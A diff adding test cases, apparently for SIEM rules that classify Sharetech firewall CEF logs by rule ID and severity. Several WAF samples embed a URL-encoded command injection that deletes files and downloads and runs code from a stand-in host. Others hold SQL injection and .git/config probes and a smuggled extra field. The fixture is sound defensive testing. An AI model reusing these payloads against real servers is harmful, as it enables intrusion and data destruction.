+   "note": "real inbound scan signature: level 6 (EventLevel 20 is on everything)"
+  },
+  {
+   "log": "Oct  8 16:59:02 fw1 ipssyslog: CEF:0|Sharetech|NU-8700C|9.0.3|20|IPS|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759913906000 cs1Label=ClassName cs1=POLICY cs2Label=EventLevel cs2=20 cs3Label=CveEvent cs3= msg=ET_POLICY_Self_Signed_SSL_Certificate_(SomeOrganizationalUnit) act=Log proto=TCP src=10.0.1.150 dst=203.0.113.130 spt=443 dpt=44129 cat=2013659",
+   "expect_rule": "100525",
+   "expect_level": 3,
+   "note": "real policy notice from an internal server (its own self-signed certificate): level 3, not \"internal attacker\""
+  },
+  {
+   "log": "Oct  8 16:59:02 fw1 ipssyslog: CEF:0|Sharetech|NU-8700C|9.0.3|20|IPS|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759913906000 cs1Label=ClassName cs1=WEB_SERVER cs2Label=EventLevel cs2=20 cs3Label=CveEvent cs3= msg=GPL_WEB_SERVER_403_Forbidden act=Log proto=TCP src=203.0.113.166 dst=10.0.4.177 spt=80 dpt=53936 cat=2101201",
+   "expect_rule": "none",
+   "expect_level": 0,
+   "note": "real 403 response signature: an error response, excluded"
+  },
+  {
+   "log": "Oct  8 16:59:02 fw1 ipssyslog: CEF:0|Sharetech|NU-8700C|9.0.3|20|IPS|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759913906000 cs1Label=ClassName cs1=WEB_SERVER cs2Label=EventLevel cs2=20 cs3Label=CveEvent cs3= msg=GPL_WEB_SERVER_403_Forbidden act=Log proto=TCP src=10.0.0.4 dst=203.0.113.170 spt=443 dpt=50111 cat=2101201",
+   "expect_rule": "none",
+   "expect_level": 0,
+   "note": "the same from an internal web server answering a scanner: still excluded, not level 10"
+  },
+  {
+   "log": "Oct  8 16:59:02 fw1 ipssyslog: CEF:0|Sharetech|NU-8700C|9.0.3|20|IPS|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759913906000 cs1Label=ClassName cs1=SCAN cs2Label=EventLevel cs2=20 cs3Label=CveEvent cs3= msg=ET_SCAN_Nmap_Scripting_Engine_User-Agent_Detected_(Nmap_Scripting_Engine) act=Log proto=TCP src=10.0.0.66 dst=10.0.0.9 spt=51515 dpt=80 cat=2009358",
+   "expect_rule": "100527",
+   "expect_level": 10,
+   "note": "an internal host scanning: level 10"
+  },
+  {
+   "log": "Oct  8 16:59:02 fw1 ipssyslog: CEF:0|Sharetech|NU-8700C|9.0.3|20|IPS|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759913906000 cs1Label=ClassName cs1=WEB_SPECIFIC_APPS cs2Label=EventLevel cs2=20 cs3Label=CveEvent cs3=CVE-2017-5638 msg=ET_EXPLOIT_Apache_Struts_RCE act=Log proto=TCP src=203.0.113.93 dst=10.0.0.4 spt=40000 dpt=443 cat=2024043",
+   "expect_rule": "100524",
+   "expect_level": 8,
+   "note": "inbound exploit attempt with a CVE",
+   "expect_in_description": [
+    "CVE-2017-5638"
+   ]
+  },
+  {
+   "log": "Oct  8 16:59:02 fw1 ipssyslog: CEF:0|Sharetech|NU-8700C|9.0.3|20|IPS|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759913906000 cs1Label=ClassName cs1=TROJAN cs2Label=EventLevel cs2=20 cs3Label=CveEvent cs3= msg=ET_TROJAN_Cobalt_Strike_Beacon_Observed act=Drop proto=TCP src=10.0.3.41 dst=203.0.113.200 spt=50123 dpt=443 cat=2027082",
+   "expect_rule": "100528",
+   "expect_level": 12,
+   "note": "trojan signature (blocked or not): possible compromise, level 12"
+  },
+  {
+   "log": "Oct  8 16:59:02 fw1 ipssyslog: CEF:0|Sharetech|NU-8700C|9.0.3|20|IPS|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759913906000 cs1Label=ClassName cs1=SCAN cs2Label=EventLevel cs2=20 cs3Label=CveEvent cs3= msg=ET_SCAN_Suspicious_inbound_to_mySQL_port_3306 act=Log proto=TCP src=203.0.113.94 dst=10.0.0.5 spt=40001 dpt=3306 cat=2010937",
+   "expect_rule": "100591",
+   "expect_level": 10,
+   "note": "10 IPS events from one source in a minute",
+   "before": [
+    "Oct  8 16:59:02 fw1 ipssyslog: CEF:0|Sharetech|NU-8700C|9.0.3|20|IPS|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759913906000 cs1Label=ClassName cs1=SCAN cs2Label=EventLevel cs2=20 cs3Label=CveEvent cs3= msg=ET_SCAN_Suspicious_inbound_to_mySQL_port_3306 act=Log proto=TCP src=203.0.113.94 dst=10.0.0.5 spt=40001 dpt=3306 cat=2010937",
+    "Oct  8 16:59:02 fw1 ipssyslog: CEF:0|Sharetech|NU-8700C|9.0.3|20|IPS|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759913906000 cs1Label=ClassName cs1=SCAN cs2Label=EventLevel cs2=20 cs3Label=CveEvent cs3= msg=ET_SCAN_Suspicious_inbound_to_mySQL_port_3306 act=Log proto=TCP src=203.0.113.94 dst=10.0.0.5 spt=40001 dpt=3306 cat=2010937",
+    "Oct  8 16:59:02 fw1 ipssyslog: CEF:0|Sharetech|NU-8700C|9.0.3|20|IPS|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759913906000 cs1Label=ClassName cs1=SCAN cs2Label=EventLevel cs2=20 cs3Label=CveEvent cs3= msg=ET_SCAN_Suspicious_inbound_to_mySQL_port_3306 act=Log proto=TCP src=203.0.113.94 dst=10.0.0.5 spt=40001 dpt=3306 cat=2010937",
+    "Oct  8 16:59:02 fw1 ipssyslog: CEF:0|Sharetech|NU-8700C|9.0.3|20|IPS|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759913906000 cs1Label=ClassName cs1=SCAN cs2Label=EventLevel cs2=20 cs3Label=CveEvent cs3= msg=ET_SCAN_Suspicious_inbound_to_mySQL_port_3306 act=Log proto=TCP src=203.0.113.94 dst=10.0.0.5 spt=40001 dpt=3306 cat=2010937",
+    "Oct  8 16:59:02 fw1 ipssyslog: CEF:0|Sharetech|NU-8700C|9.0.3|20|IPS|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759913906000 cs1Label=ClassName cs1=SCAN cs2Label=EventLevel cs2=20 cs3Label=CveEvent cs3= msg=ET_SCAN_Suspicious_inbound_to_mySQL_port_3306 act=Log proto=TCP src=203.0.113.94 dst=10.0.0.5 spt=40001 dpt=3306 cat=2010937",
+    "Oct  8 16:59:02 fw1 ipssyslog: CEF:0|Sharetech|NU-8700C|9.0.3|20|IPS|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759913906000 cs1Label=ClassName cs1=SCAN cs2Label=EventLevel cs2=20 cs3Label=CveEvent cs3= msg=ET_SCAN_Suspicious_inbound_to_mySQL_port_3306 act=Log proto=TCP src=203.0.113.94 dst=10.0.0.5 spt=40001 dpt=3306 cat=2010937",
+    "Oct  8 16:59:02 fw1 ipssyslog: CEF:0|Sharetech|NU-8700C|9.0.3|20|IPS|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759913906000 cs1Label=ClassName cs1=SCAN cs2Label=EventLevel cs2=20 cs3Label=CveEvent cs3= msg=ET_SCAN_Suspicious_inbound_to_mySQL_port_3306 act=Log proto=TCP src=203.0.113.94 dst=10.0.0.5 spt=40001 dpt=3306 cat=2010937",
+    "Oct  8 16:59:02 fw1 ipssyslog: CEF:0|Sharetech|NU-8700C|9.0.3|20|IPS|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759913906000 cs1Label=ClassName cs1=SCAN cs2Label=EventLevel cs2=20 cs3Label=CveEvent cs3= msg=ET_SCAN_Suspicious_inbound_to_mySQL_port_3306 act=Log proto=TCP src=203.0.113.94 dst=10.0.0.5 spt=40001 dpt=3306 cat=2010937",
+    "Oct  8 16:59:02 fw1 ipssyslog: CEF:0|Sharetech|NU-8700C|9.0.3|20|IPS|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759913906000 cs1Label=ClassName cs1=SCAN cs2Label=EventLevel cs2=20 cs3Label=CveEvent cs3= msg=ET_SCAN_Suspicious_inbound_to_mySQL_port_3306 act=Log proto=TCP src=203.0.113.94 dst=10.0.0.5 spt=40001 dpt=3306 cat=2010937"
+   ]
+  },
+  {
+   "log": "Oct  8 16:44:02 fw1 waflog: CEF:0|Sharetech|NU-8700C|9.0.3|120|WAF_RECORD|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759912992000 cs3Label=Hostname cs3=203.0.113.215 cs4Label=DstServer cs4=10.0.0.4:888 cs5Label=Url cs5=https://mail.example.com:888%2FWebMailAPI%2FgetMailList%3Fkey%3Dabc%26folder%3DUNREAD%26search%3D%7B%250A%2B%2B%2522all%2522%257D cs6Label=Event cs6=[942110] Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12) SharetechAction=Log cat=SQL Injection Attack cnt=1",
+   "expect_rule": "100531",
+   "expect_level": 7,
+   "note": "real WAF SQL injection record; client address from cs3",
+   "expect_in_description": [
+    "203.0.113.215",
+    "942110"
+   ]
+  },
+  {
+   "log": "Oct  8 16:44:02 fw1 waflog: CEF:0|Sharetech|NU-8700C|9.0.3|120|WAF_RECORD|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759912992000 cs3Label=Hostname cs3=203.0.113.217 cs4Label=DstServer cs4=10.0.1.150:80 cs5Label=Url cs5=http://127.0.0.1:80%2Fshell%3Fcd%2B%2Ftmp%3Brm%2B-rf%2B%2A%3Bwget%2B+malware.example%2Fjaws%3Bsh%2B%2Ftmp%2Fjaws cs6Label=Event cs6=[902350] Remote Command Execution: Unix Command Injection #2 SharetechAction=Log cat=Remote Command Execution cnt=1",
+   "expect_rule": "100547",
+   "expect_level": 10,
+   "note": "real RCE attempt that the WAF only logged: it reached the server, level 10"
+  },
+  {
+   "log": "Oct  8 16:44:02 fw1 waflog: CEF:0|Sharetech|NU-8700C|9.0.3|120|WAF_RECORD|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759912992000 cs3Label=Hostname cs3=203.0.113.218 cs4Label=DstServer cs4=10.0.1.150:80 cs5Label=Url cs5=http://127.0.0.1:80%2Fshell%3Fcd%2B%2Ftmp%3Brm%2B-rf%2B%2A%3Bwget%2B+malware.example%2Fjaws%3Bsh%2B%2Ftmp%2Fjaws cs6Label=Event cs6=[902350] Remote Command Execution: Unix Command Injection #2 SharetechAction=Block cat=Remote Command Execution cnt=1",
+   "expect_rule": "100534",
+   "expect_level": 8,
+   "note": "the same when blocked: level 8"
+  },
+  {
+   "log": "Oct  8 16:44:02 fw1 waflog: CEF:0|Sharetech|NU-8700C|9.0.3|120|WAF_RECORD|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759912992000 cs3Label=Hostname cs3=203.0.113.156 cs4Label=DstServer cs4=10.0.0.4:443 cs5Label=Url cs5=https://198.51.100.11%2F.git%2Fconfig cs6Label=Event cs6=[930130] Host header is a numeric IP address SharetechAction=Log cat=Numeric IP Address cnt=1",
+   "expect_rule": "100537",
+   "expect_level": 4,
+   "note": "real numeric-host record (scanner hitting the IP): level 4"
+  },
+  {
+   "log": "Oct  8 16:44:02 fw1 waflog: CEF:0|Sharetech|NU-8700C|9.0.3|120|WAF_RECORD|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759912992000 cs3Label=Hostname cs3=203.0.113.156 cs4Label=DstServer cs4=10.0.0.4:443 cs5Label=Url cs5=https://198.51.100.11%2F.git%2Fconfig cs6Label=Event cs6=[930130] Restricted File Access Attempt SharetechAction=Log cat=Local File Inclusion Attack cnt=1",
+   "expect_rule": "100535",
+   "expect_level": 7,
+   "note": "real restricted-file record (.git/config probe)"
+  },
+  {
+   "log": "Oct  8 16:44:02 fw1 waflog: CEF:0|Sharetech|NU-8700C|9.0.3|120|WAF_RECORD|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759912992000 cs3Label=Hostname cs3=203.0.113.219 cs4Label=DstServer cs4=10.0.1.150:80 cs5Label=Url cs5=http://127.0.0.1:80%2Fshell%3Fcd%2B%2Ftmp%3Brm%2B-rf%2B%2A%3Bwget%2B+malware.example%2Fjaws%3Bsh%2B%2Ftmp%2Fjaws cs6Label=Event cs6=[902350] Remote Command Execution: Unix Command Injection #2 SharetechAction=Log cat=Remote Command Execution cnt=1",
+   "expect_rule": "100594",
+   "expect_level": 12,
+   "note": "five command execution attempts from one source",
+   "before": [
+    "Oct  8 16:44:02 fw1 waflog: CEF:0|Sharetech|NU-8700C|9.0.3|120|WAF_RECORD|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759912992000 cs3Label=Hostname cs3=203.0.113.219 cs4Label=DstServer cs4=10.0.1.150:80 cs5Label=Url cs5=http://127.0.0.1:80%2Fshell%3Fcd%2B%2Ftmp%3Brm%2B-rf%2B%2A%3Bwget%2B+malware.example%2Fjaws%3Bsh%2B%2Ftmp%2Fjaws cs6Label=Event cs6=[902350] Remote Command Execution: Windows Command Injection #2 SharetechAction=Log cat=Remote Command Execution cnt=1",
+    "Oct  8 16:44:02 fw1 waflog: CEF:0|Sharetech|NU-8700C|9.0.3|120|WAF_RECORD|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759912992000 cs3Label=Hostname cs3=203.0.113.219 cs4Label=DstServer cs4=10.0.1.150:80 cs5Label=Url cs5=http://127.0.0.1:80%2Fshell%3Fcd%2B%2Ftmp%3Brm%2B-rf%2B%2A%3Bwget%2B+malware.example%2Fjaws%3Bsh%2B%2Ftmp%2Fjaws cs6Label=Event cs6=[902350] Remote Command Execution: Windows Command Injection #2 SharetechAction=Log cat=Remote Command Execution cnt=1",
+    "Oct  8 16:44:02 fw1 waflog: CEF:0|Sharetech|NU-8700C|9.0.3|120|WAF_RECORD|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759912992000 cs3Label=Hostname cs3=203.0.113.219 cs4Label=DstServer cs4=10.0.1.150:80 cs5Label=Url cs5=http://127.0.0.1:80%2Fshell%3Fcd%2B%2Ftmp%3Brm%2B-rf%2B%2A%3Bwget%2B+malware.example%2Fjaws%3Bsh%2B%2Ftmp%2Fjaws cs6Label=Event cs6=[902350] Remote Command Execution: Windows Command Injection #2 SharetechAction=Log cat=Remote Command Execution cnt=1",
+    "Oct  8 16:44:02 fw1 waflog: CEF:0|Sharetech|NU-8700C|9.0.3|120|WAF_RECORD|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759912992000 cs3Label=Hostname cs3=203.0.113.219 cs4Label=DstServer cs4=10.0.1.150:80 cs5Label=Url cs5=http://127.0.0.1:80%2Fshell%3Fcd%2B%2Ftmp%3Brm%2B-rf%2B%2A%3Bwget%2B+malware.example%2Fjaws%3Bsh%2B%2Ftmp%2Fjaws cs6Label=Event cs6=[902350] Remote Command Execution: Windows Command Injection #2 SharetechAction=Log cat=Remote Command Execution cnt=1"
+   ]
+  },
+  {
+   "log": "Oct  8 16:44:02 fw1 waflog: CEF:0|Sharetech|NU-8700C|9.0.3|120|WAF_RECORD|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759912992000 cs3Label=Hostname cs3=203.0.113.220 cs4Label=DstServer cs4=10.0.0.4:443 cs5Label=Url cs5=https://198.51.100.11%2Findex.php%3Fq%3D1%27 cs6Label=Event cs6=[942100] SQL Injection Attack Detected via libinjection SharetechAction=Log cat=SQL Injection Attack cnt=1",
+   "expect_rule": "100595",
+   "expect_level": 10,
+   "note": "ten WAF events from one source in five minutes",
+   "before": [
+    "Oct  8 16:44:02 fw1 waflog: CEF:0|Sharetech|NU-8700C|9.0.3|120|WAF_RECORD|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759912992000 cs3Label=Hostname cs3=203.0.113.220 cs4Label=DstServer cs4=10.0.0.4:443 cs5Label=Url cs5=https://198.51.100.11%2Findex.php%3Fq%3D1%27 cs6Label=Event cs6=[942100] SQL Injection Attack Detected via libinjection SharetechAction=Log cat=SQL Injection Attack cnt=1",
+    "Oct  8 16:44:02 fw1 waflog: CEF:0|Sharetech|NU-8700C|9.0.3|120|WAF_RECORD|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759912992000 cs3Label=Hostname cs3=203.0.113.220 cs4Label=DstServer cs4=10.0.0.4:443 cs5Label=Url cs5=https://198.51.100.11%2Findex.php%3Fq%3D1%27 cs6Label=Event cs6=[942100] SQL Injection Attack Detected via libinjection SharetechAction=Log cat=SQL Injection Attack cnt=1",
+    "Oct  8 16:44:02 fw1 waflog: CEF:0|Sharetech|NU-8700C|9.0.3|120|WAF_RECORD|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759912992000 cs3Label=Hostname cs3=203.0.113.220 cs4Label=DstServer cs4=10.0.0.4:443 cs5Label=Url cs5=https://198.51.100.11%2Findex.php%3Fq%3D1%27 cs6Label=Event cs6=[942100] SQL Injection Attack Detected via libinjection SharetechAction=Log cat=SQL Injection Attack cnt=1",
+    "Oct  8 16:44:02 fw1 waflog: CEF:0|Sharetech|NU-8700C|9.0.3|120|WAF_RECORD|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759912992000 cs3Label=Hostname cs3=203.0.113.220 cs4Label=DstServer cs4=10.0.0.4:443 cs5Label=Url cs5=https://198.51.100.11%2Findex.php%3Fq%3D1%27 cs6Label=Event cs6=[942100] SQL Injection Attack Detected via libinjection SharetechAction=Log cat=SQL Injection Attack cnt=1",
+    "Oct  8 16:44:02 fw1 waflog: CEF:0|Sharetech|NU-8700C|9.0.3|120|WAF_RECORD|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759912992000 cs3Label=Hostname cs3=203.0.113.220 cs4Label=DstServer cs4=10.0.0.4:443 cs5Label=Url cs5=https://198.51.100.11%2Findex.php%3Fq%3D1%27 cs6Label=Event cs6=[942100] SQL Injection Attack Detected via libinjection SharetechAction=Log cat=SQL Injection Attack cnt=1",
+    "Oct  8 16:44:02 fw1 waflog: CEF:0|Sharetech|NU-8700C|9.0.3|120|WAF_RECORD|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759912992000 cs3Label=Hostname cs3=203.0.113.220 cs4Label=DstServer cs4=10.0.0.4:443 cs5Label=Url cs5=https://198.51.100.11%2Findex.php%3Fq%3D1%27 cs6Label=Event cs6=[942100] SQL Injection Attack Detected via libinjection SharetechAction=Log cat=SQL Injection Attack cnt=1",
+    "Oct  8 16:44:02 fw1 waflog: CEF:0|Sharetech|NU-8700C|9.0.3|120|WAF_RECORD|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759912992000 cs3Label=Hostname cs3=203.0.113.220 cs4Label=DstServer cs4=10.0.0.4:443 cs5Label=Url cs5=https://198.51.100.11%2Findex.php%3Fq%3D1%27 cs6Label=Event cs6=[942100] SQL Injection Attack Detected via libinjection SharetechAction=Log cat=SQL Injection Attack cnt=1",
+    "Oct  8 16:44:02 fw1 waflog: CEF:0|Sharetech|NU-8700C|9.0.3|120|WAF_RECORD|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759912992000 cs3Label=Hostname cs3=203.0.113.220 cs4Label=DstServer cs4=10.0.0.4:443 cs5Label=Url cs5=https://198.51.100.11%2Findex.php%3Fq%3D1%27 cs6Label=Event cs6=[942100] SQL Injection Attack Detected via libinjection SharetechAction=Log cat=SQL Injection Attack cnt=1",
+    "Oct  8 16:44:02 fw1 waflog: CEF:0|Sharetech|NU-8700C|9.0.3|120|WAF_RECORD|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759912992000 cs3Label=Hostname cs3=203.0.113.220 cs4Label=DstServer cs4=10.0.0.4:443 cs5Label=Url cs5=https://198.51.100.11%2Findex.php%3Fq%3D1%27 cs6Label=Event cs6=[942100] SQL Injection Attack Detected via libinjection SharetechAction=Log cat=SQL Injection Attack cnt=1"
+   ]
+  },
+  {
+   "log": "Oct  8 16:44:02 fw1 waflog: CEF:0|Sharetech|NU-8700C|9.0.3|120|WAF_RECORD|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759912992000 cs3Label=Hostname cs3=203.0.113.221 cs4Label=DstServer cs4=10.0.0.4:443 cs5Label=Url cs5=https://198.51.100.11%2Fx cs6Label=Event cs6=[942100] x SharetechAction=Log cat=SQL Injection Attack cat=Numeric IP Address cnt=1",
+   "expect_rule": "100505",
+   "expect_level": 10,
+   "note": "a WAF value carrying a second cat=: flagged as possible injection"
+  },
+  {
+   "log": "Oct  8 14:12:01 fw1 anomalylog: CEF:0|Sharetech|NU-8700C|9.0.3|90|ADVANCE_PROTECT|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759903891000 src=10.0.5.33 act=Notify msg= reason=Session cs1Label=LimitValue cs1=200 cs2Label=ActualValue cs2=218 cs3Label=Period cs3=120",
+   "expect_rule": "100541",
+   "expect_level": 6,
+   "note": "real session-limit record",
+   "expect_in_description": [
+    "218",
+    "200"
+   ]
+  },
+  {
+   "log": "Oct  8 14:06:01 fw1 appsyslog: CEF:0|Sharetech|NU-8700C|9.0.3|40|APPLICATION_CONTROLL|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759903538000 cs1Label=AppName cs1= cs2Label=AppGroup cs2=Unknown act=DROP proto=TCP src=10.0.3.200 dst=203.0.113.202 spt=58129 dpt=443",
+   "expect_rule": "100551",
+   "expect_level": 3,
+   "note": "real application-control drop (empty AppName): level 3"
+  },
+  {
+   "log": "Oct  8 11:26:15 fw1 syslog_sys[26298]: CEF:0|Sharetech|NU-8700C|9.0.3|1401|SYSTEM_EVENT_IPADDRESS|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759893975000 suser=fwadmin src=10.0.0.51 SharetechManagementIP=10.0.0.1 act=Edit cs1Label=Path cs1=Object > IP Address > IP Address Group cs2Label=Function cs2=IP Address Group cs3Label=Name cs3=SERVER cs4Label=SelectMembers cs4=Server-AD01   HostA_ESXI-112     IDRAC-91        FILE-2025 SharetechUserDefine=10.0.0.10     10.0.0.102   10.0.0.103",
+   "expect_rule": "100561",
+   "expect_level": 5,
+   "note": "real address-group edit (values with spaces and tabs)",
+   "expect_in_description": [
+    "fwadmin",
+    "SERVER",
+    "Object > IP Address > IP Address Group"
+   ]
+  },
+  {
+   "log": "Oct  8 15:33:57 fw1 syslog_sys[26298]: CEF:0|Sharetech|NU-8700C|9.0.3|1402|SYSTEM_EVENT_POLICY|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759893975000 suser=fwadmin src=10.0.0.51 SharetechManagementIP=10.0.0.1 act=Edit cs1Label=Path cs1=Policy > Outgoing cs2Label=Function cs2=Outgoing cs3Label=Name cs3=Allow-All",
+   "expect_rule": "100562",
+   "expect_level": 7,
+   "note": "security policy edit"
+  },
+  {
+   "log": "Oct  8 15:33:57 fw1 syslog_sys[26298]: CEF:0|Sharetech|NU-8700C|9.0.3|1403|SYSTEM_EVENT_ADMIN|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759893975000 suser=fwadmin src=10.0.0.51 SharetechManagementIP=10.0.0.1 act=Add cs1Label=Path cs1=System > Administrator cs2Label=Function cs2=Administrator cs3Label=Name cs3=backup2",
+   "expect_rule": "100563",
+   "expect_level": 9,
+   "note": "administrator account added"
+  },
+  {
+   "log": "Oct  8 15:33:57 fw1 syslog_sys[26298]: CEF:0|Sharetech|NU-8700C|9.0.3|1402|SYSTEM_EVENT_POLICY|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759893975000 suser=fwadmin src=198.51.100.60 SharetechManagementIP=10.0.0.1 act=Edit cs1Label=Path cs1=Policy > Incoming cs2Label=Function cs2=Incoming cs3Label=Name cs3=Any",
+   "expect_rule": "100567",
+   "expect_level": 10,
+   "note": "policy changed from a public address"
+  },
+  {
+   "log": "Oct  8 15:33:57 fw1 syslog_sys[26298]: CEF:0|Sharetech|NU-8700C|9.0.3|1499|SYSTEM_EVENT_ROUTE|10|deviceExternalId=P00000001 dvchost=NU-8700C deviceCustomDate1Label=EventTime deviceCustomDate1=1759893975000 suser=fwadmin src=10.0.0.51 SharetechManagementIP=10.0.0.1 act=Edit cs1Label=Path cs1=Network > Routing cs2Label=Function cs2=Static Route cs3Label=Name cs3=r1",
+   "expect_rule": "100566",
+   "expect_level": 5,
+   "note": "a system event type without its own rule still reports, with its name"
+  },
+  {
+   "log": "Oct  8 15:33:57 fw1 sandstorm: CEF:0|Sharetech|NU-8700C|9.0.3|130|SANDSTORM_RESULT|10|deviceExternalId=P00000001 dvchost=NU-8700C src=10.0.0.70 cs1Label=File cs1=a.exe",
+   "expect_rule": "100506",
+   "expect_level": 3,
+   "note": "an event type not seen yet (unknown program name too): reported at level 3 with its name",
+   "expect_in_description": [
+    "SANDSTORM_RESULT"
+   ]
+  }
+ ]
+}
